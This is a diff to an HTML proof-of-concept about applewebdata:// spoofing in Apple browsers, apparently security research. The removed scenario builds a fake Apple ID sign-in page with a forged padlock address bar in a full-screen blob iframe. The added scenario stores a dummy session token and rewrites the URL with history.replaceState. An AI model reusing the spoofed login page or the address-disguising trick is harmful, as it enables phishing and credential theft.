@@ -1,34 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Applewebdata Spoof - Scenario 1</title>
+  <title>Applewebdata Storage Bypass - Scenario 2</title>
   <script>
-    function simulateAppleWebdataSpoof() {
-      const spoofContent = `
-        <html>
-        <head><title>Apple ID</title></head>
-        <body style='margin:0;font-family:-apple-system;'>
-          <div style='background:#eee;padding:10px;font-size:14px;'>🔒 https://appleid.apple.com</div>
-          <div style='padding:20px;'>
-            <h2>Sign in with your Apple ID</h2>
-            <input placeholder='Apple ID' style='width:100%;padding:10px;'>
-            <input type='password' placeholder='Password' style='width:100%;padding:10px;'>
-            <button style='padding:10px;width:100%;background:#007aff;color:white;'>Sign In</button>
-          </div>
-        </body>
-        </html>`;
+    async function simulateStorageLeakage() {
+      const innerHTML = `
+        <script>
+          localStorage.setItem('session_token', 'apple-user-1234-secret');
+          document.body.innerHTML = '<h3>Session Stored in LocalStorage</h3>';
+        <\/script>
+      `;
 
-      const blob = new Blob([spoofContent], { type: 'text/html' });
+      const blob = new Blob([innerHTML], { type: 'text/html' });
       const blobURL = URL.createObjectURL(blob);
+
       const iframe = document.createElement('iframe');
       iframe.src = blobURL;
-      iframe.style = 'width:100vw;height:100vh;border:none;';
+      iframe.style = 'width:100vw;height:100vh;border:none';
       document.body.appendChild(iframe);
 
-      // Simulate internal redirection to applewebdata URL on reload/fallback
-      history.replaceState({}, '', 'applewebdata://B2F21D7E-61BA-4FC1-95F3-127741F4C123/index.html');
+      // Simulate fallback to applewebdata scheme (in real case this could be history or reload)
+      history.replaceState({}, '', 'applewebdata://LEAK-UUID/index.html');
     }
-    window.onload = simulateAppleWebdataSpoof;
+
+    window.onload = simulateStorageLeakage;
   </script>
 </head>
 <body style="margin:0">
